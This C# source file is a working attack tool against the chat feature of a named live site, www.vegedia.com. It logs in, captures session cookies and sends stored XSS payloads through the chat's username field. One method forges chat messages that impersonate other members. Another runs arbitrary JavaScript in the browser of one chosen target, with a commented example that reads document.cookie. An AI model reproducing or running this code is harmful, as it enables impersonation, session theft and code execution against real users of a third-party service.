using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace VegediaChatMessageForger
{
    partial class VegediaAPI
    {
        private static readonly string _sessionName = "PHPSESSID";

        /**
         * NFO :
         * Upper case has a lower dec value and make less longer string than lower case when encoded
         */
        private static readonly string _htmlLineFormat =
            "<IMG SRC=%avatar% CLASS=arrowchat_chatroom_message_avatar>" +
            "<DIV class=arrowchat_chatroom_message_name>%username%:</DIV>" +
            "<DIV class=arrowchat_chatroom_message_content>%message%</DIV>"
        ;
        private static readonly string _xssFormat = "<img src=%src% onload=%xss% />";

        private string _sessionId = null;
        private bool _sessionIdValidated = false;

        public string SessionId { get { return _sessionId; } }
        public bool IsSessionIdValid { get { return _sessionIdValidated; } }

        [DebuggerHidden()]
        public VegediaAPI(string login, string passwd)
        {
            string sessionId = GetSessionId(login, passwd);

            if (sessionId != null)
            {
                _sessionId = sessionId;
                _sessionIdValidated = true;
            } else throw new Exception("Bad login or passwd");
        }     

        [DebuggerHidden()]
        public VegediaAPI(string sessionId)
        {
            if (isValidSessionId(sessionId))
            {
                _sessionId = sessionId;
                _sessionIdValidated = true;
            } else throw new Exception("SessionId not valid");
        }

        private static string urlencode(string value) { return Uri.EscapeDataString(value); }

        public static string GetSessionId(string login, string passwd)
        {
            string data = "email=" + urlencode(login) + "&password=" + urlencode(passwd) + "&submit=&remember=&remember=1&return_url=";
            string response = MakeRequest("/login", data);

            if (Regex.IsMatch(response, @"(?i)Location:\ */members/home"))
                return Regex.Match(response, @"(?i).*" + _sessionName + "=([a-z0-9]+)").Groups[1].Value;
            else
                return null;
        }

        public static bool isValidSessionId(string sessionId)
        {
            string response = MakeRequest("/members/home", null, _sessionName + "=" + sessionId);
            string action1 = Regex.Match(response, "(?i)<form.*?action=\"([^\"]*)").Groups[1].Value.ToLower();
            return !string.IsNullOrEmpty(action1) && action1 != "/login";
        }

        public IEnumerable<VegediaBuddy> GetChatBuddies()
        {
            string response = Utility.UnescapeUnicode(makeRequest("/arrowchat/includes/json/receive/receive_buddylist.php"));
            MatchCollection matches = Regex.Matches(response, VegediaBuddy.JSonParseRegex);

            if (matches.Count != 0)
            {
                foreach (Match match in matches)
                    yield return VegediaBuddy.ParseFromJSon(match.Groups[0].Value);
            }
            else yield break;
        }

        public void SendChatMessage(int chatroomid, string username, string message)
        {
            string data = "username=" + username +"&chatroomid=";
            data += chatroomid.ToString() + "&message=" + urlencode(message);
            Debug.Print(data);
            makeRequest("/arrowchat/includes/json/send/send_message_chatroom.php", data);
        }

        public void SendFakeChatMessage(int chatroomid, VegediaBuddy buddy, string message)
        {
            string htmlInjection = _htmlLineFormat;
            htmlInjection = htmlInjection.Replace("%avatar%", buddy.AvatarUrl);
            htmlInjection = htmlInjection.Replace("%username%", buddy.Pseudo);
            htmlInjection = htmlInjection.Replace("%message%", WebUtility.HtmlEncode(message));

            string exploit = "$(this.parentNode.parentNode).set(String.fromCharCode(104,116,109,108),";
            exploit += Utility.EncodeToCharCode(htmlInjection) + ")";

            string username = _xssFormat.Replace("%src%", buddy.AvatarUrl);
            username = username.Replace("%xss%", exploit) + buddy.Pseudo;

            SendChatMessage(chatroomid, username, message);
        }

        public void JsExecTargeted(int chatroomid, string username, string message, VegediaBuddy target, string jscode)
        {
            /*
             if(en4.user.viewer.id==1254){alert(document.cookie)}
             */

            string exploit = "<img width=0 height=0 src=null onerror=";
            exploit += "if(en4.user.viewer.id==" + target.Id + "){";
            exploit += jscode + (jscode.EndsWith(";") ? "" : ";") + "} />";

            SendChatMessage(chatroomid, exploit + username, message);
        }

        private string makeRequest(string path, string postData = null, string forceCookie = null, string host = "www.vegedia.com")
        {
            return MakeRequest(path, postData, forceCookie != null ? forceCookie : _sessionName + "=" + _sessionId, host);
        }

        public static string MakeRequest(string path, string postData = null, string forceCookie = null, string host = "www.vegedia.com")
        {
            string result = null;
            WebClientEx wc = new WebClientEx();

            string url = "http://" + host + path;
            
            try
            {
                if (forceCookie != null)
                    wc.Headers["Cookie"] = forceCookie;

                if (!string.IsNullOrEmpty(postData))
                {
                    wc.Headers["Content-Type"] = "application/x-www-form-urlencoded";
                    result = wc.UploadString(url, postData);
                }
                else
                    result = wc.DownloadString(url);

                result = wc.ResponseHeaders.ToString() + result;
            }
            catch (Exception ex) { Debug.Print(ex.Message); }

            return result;
        }
    }    
}
